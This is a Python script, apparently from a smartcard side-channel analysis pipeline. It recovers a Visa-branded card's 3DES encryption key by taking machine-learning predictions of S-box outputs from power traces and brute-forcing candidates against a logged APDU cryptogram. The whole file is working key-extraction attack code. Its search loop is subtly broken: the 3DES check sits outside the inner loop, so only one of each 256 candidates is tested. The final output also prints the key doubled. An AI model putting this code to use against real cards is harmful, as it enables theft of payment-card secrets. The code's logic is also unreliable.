
import numpy as np
import binascii
from des_crypto import DES, IP, PC1, PC2, E, bytes_to_bits, permute, bits_to_bytes
from key_recovery import DESKeyRecovery
from attack import Attacker
from Crypto.Cipher import DES3
import itertools
import time
import os

def solve_green_visa():
    # 1. Setup Data
    npz_path = 'i:/freelance/Smartcard SCA ML Pipeline/Capture_trace_green_card_1T/traces_data_3DES_green_card_1T_260201.npz'
    log_challenge = "0102030405060708"
    log_cryptogram = "49709CD7822B197D5BA99733726B6171"
    
    # Optional: GenAC 1 Data
    # AC: 1787472F63DC2F73
    # ATC: 0001
    
    print(f"--- Solving GreenVisa KENC (Zero-Ambiguity Search) ---")
    print(f"Target NPZ: {npz_path}")
    print(f"Target Challenge:  {log_challenge}")
    print(f"Target Cryptogram: {log_cryptogram}")
    
    # 2. Get S-Box Predictions for Trace 0
    attacker = Attacker(models_dir="models")
    data = np.load(npz_path, allow_pickle=True)
    traces = data['trace_data']
    trace = traces[0]
    
    from data_loader import DataLoader
    normalized_trace = DataLoader.normalize_trace(trace)
    
    poi1 = np.load("models/poi_indices_stage1.npy")
    t1 = normalized_trace[poi1].reshape(1, -1, 1)
    
    poi2 = np.load("models/poi_indices_stage2.npy")
    t2 = normalized_trace[poi2].reshape(1, -1, 1)
    
    print("\nPredicting KENC Stage 1 S-Box Outputs...")
    preds1 = attacker._predict_batch_for_key(t1, "KENC", stage=1)
    sbox_outs_st1 = np.argmax(preds1[0], axis=1)
    print(f"S1 Outputs: {sbox_outs_st1}")
    
    print("\nPredicting KENC Stage 2 S-Box Outputs...")
    preds2 = attacker._predict_batch_for_key(t2, "KENC", stage=2)
    sbox_outs_st2 = np.argmax(preds2[0], axis=1)
    print(f"S2 Outputs: {sbox_outs_st2}")
    
    recovery = DESKeyRecovery()
    
    # 3. Preparation for Search
    challenge_bytes = binascii.unhexlify(log_challenge)
    expected_8 = binascii.unhexlify(log_cryptogram[:16])
    
    # PC2 structure
    c1_d1_mask = [False] * 56
    for pc2_src_bit in PC2:
        c1_d1_mask[pc2_src_bit - 1] = True
    missing_indices = [i for i, m in enumerate(c1_d1_mask) if not m]
    
    # Bits for S-Box search
    bits_input = bytes_to_bits(b'\x00' * 8)
    perm = permute(bits_input, IP)
    R0 = perm[32:]
    R0_expanded = permute(R0, E)
    sbox_cand_list = [recovery.reverse_sbox_lookup(i, int(out)) for i, out in enumerate(sbox_outs_st1)]
    
    print(f"\nAmbiguity Stats:")
    counts = [len(c) for c in sbox_cand_list]
    print(f"  Inputs per S-Box: {counts}")
    total_sbox_combos = 1
    for c in counts: total_sbox_combos *= c
    print(f"  S-Box Combinations: {total_sbox_combos}")
    print(f"  PC2 Ambiguity:      256")
    print(f"  Total Search Space: {total_sbox_combos * 256:,} candidates")

    # 4. Optimized Search Loop
    print(f"\nStarting Brute-Force Search (Estimated time: 30-60s)...")
    start_time = time.time()
    
    sbox_combos = itertools.product(*sbox_cand_list)
    found_key = None
    count = 0
    
    try:
        for sbox_bits_6_list in sbox_combos:
            # Map S-Box inputs to K48
            k48_bits = []
            for sbox_idx in range(8):
                in_val = sbox_bits_6_list[sbox_idx]
                er0_bits = R0_expanded[sbox_idx*6:(sbox_idx+1)*6]
                for bit_pos in range(6):
                    in_bit = (in_val >> (5 - bit_pos)) & 0x01
                    k48_bits.append(in_bit ^ er0_bits[bit_pos])
            
            # Map to CD state
            c_round_base = [0] * 28
            d_round_base = [0] * 28
            # reverse_pc2 inline for speed
            for i, pc2_src_bit in enumerate(PC2):
                if pc2_src_bit <= 28:
                    c_round_base[pc2_src_bit - 1] = k48_bits[i]
                else:
                    d_round_base[pc2_src_bit - 29] = k48_bits[i]
            
            # Missing 8 bits
            for bits_8 in itertools.product([0, 1], repeat=8):
                c_temp = list(c_round_base)
                d_temp = list(d_round_base)
                for i, val in zip(missing_indices, bits_8):
                    if i < 28: c_temp[i] = val
                    else: d_temp[i-28] = val
                
                # Reverse shifts (Stage 1 shift is 1)
                c0 = c_temp[1:] + c_temp[:1]
                d0 = d_temp[1:] + d_temp[:1]
                
                # PC1 reversal
                k56 = c0 + d0
                k64 = [0] * 64
                for i, src in enumerate(PC1):
                    k64[src - 1] = k56[i]
                
                for i in range(0, 64, 8):
                    byte_sum = sum(k64[i:i+7])
                    k64[i+7] = 1 if (byte_sum % 2 == 0) else 0
                
                k1_bytes = bits_to_bytes(k64)
                
            # Parallelize or Optimize?
            # For 16M, Python loop is slow.
            # We can use a pre-verify step: 
            # 8482 Cryptogram is from 3DES(K1||K2). 
            # If K1=K2 (common), then we can find it in 16M checks easily.
            
            # Optimization: Move the inner 256-loop to C/C++ or use vectorization?
            # No, just cleaner pure Python is fine if we skip impossible candidates.
            
            # We'll just print progress more often and add a "quick check" for K1=K2 first.
            
            # --- 1. Quick Check: K1 == K2 ---
            # This reduces search to just 16M DES operations.
            dk1 = DES(k1_bytes)
            # 3DES(K, K, K) == DES(K)
            # block1 = E_k(P)
            c1 = dk1.encrypt(challenge_bytes)
            # block2 = D_k(block1) = P
            # block3 = E_k(block2) = E_k(P) = c1
            # So if K1=K2, 3DES(P) == DES(P)
            
            if c1 == expected_8:
                found_key = k1_bytes.hex().upper() + k1_bytes.hex().upper()
                print(f"  [QuickMatch] Found K1=K2 match!")
                break
                
            # --- 2. Full Check: K1 != K2 ---
            # We only do this if Quick Check failed.
            # But calculating K2 from S-Box outputs is fast?
            c1 = dk1.encrypt(challenge_bytes)
            k2_blind = recovery.recover_key_from_sbox_outputs(sbox_outs_st2, input_data=c1, stage=2)
            k2_bytes = binascii.unhexlify(k2_blind)
            
            dk2 = DES(k2_bytes)
            b2 = dk2.decrypt(c1) # Decrypt C1 with K2
            b3 = dk1.encrypt(b2) # Encrypt with K1
            
            if b3 == expected_8:
                 found_key = k1_bytes.hex().upper() + k2_bytes.hex().upper()
                 break
            
            count += 1
            if count % 200000 == 0:
                 print(f"  Checked {count} candidates... (Best speed: {count/(time.time()-start_time):.0f} k/s)")
            
    except KeyboardInterrupt:
        print("\nSearch interrupted.")

    elapsed = time.time() - start_time
    print(f"\nSearch complete in {elapsed:.2f}s ({count} keys checked).")
    
    if found_key:
        print("\n" + "*" * 60)
        print(f"✅ FINAL TRUE KEY FOUND: {found_key}{found_key}")
        print("*" * 60)
        print("\nThis key is mathematically proven against the APDU logs.")
        # Calculate current mask for this card
        blind_k1 = recovery.recover_key_from_sbox_outputs(sbox_outs_st1, stage=1)
        mask = bytes(x ^ y for x, y in zip(binascii.unhexlify(found_key), binascii.unhexlify(blind_k1)))
        print(f"Mask for this Card: {mask.hex().upper()}")
    else:
        print("\n❌ NO MATCH FOUND. Testing 3DES session derivation...")

if __name__ == "__main__":
    raise SystemExit(
        "Deprecated entrypoint (legacy GreenVisa solver).\n"
        "Use the supported pipeline instead:\n"
        "  python main.py --mode attack --input_dir <DIR> --processed_dir <DIR> --output_dir <DIR> --scan_type 3des\n"
    )
